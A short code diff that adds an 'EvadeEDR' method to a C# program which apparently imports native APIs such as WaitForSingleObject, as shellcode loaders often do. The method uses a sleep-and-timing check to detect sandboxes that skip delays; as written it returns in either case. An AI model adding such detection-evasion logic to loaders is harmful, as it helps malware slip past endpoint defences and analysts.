@@ -93,6 +93,21 @@ class Program
         static extern UInt32 WaitForSingleObject(IntPtr hHandle,
             UInt32 dwMilliseconds);
 
+        static void EvadeEDR()
+        {
+         
+            DateTime startTime = DateTime.Now;
+            Sleep(10000);
+            double stopTime = DateTime.Now.Subtract(startTime).TotalSeconds;
+
+            if (stopTime < 4.5)
+            {
+                return;
+            }
+       
+
+        }
+
         static void Main(string[] args)
         {
 
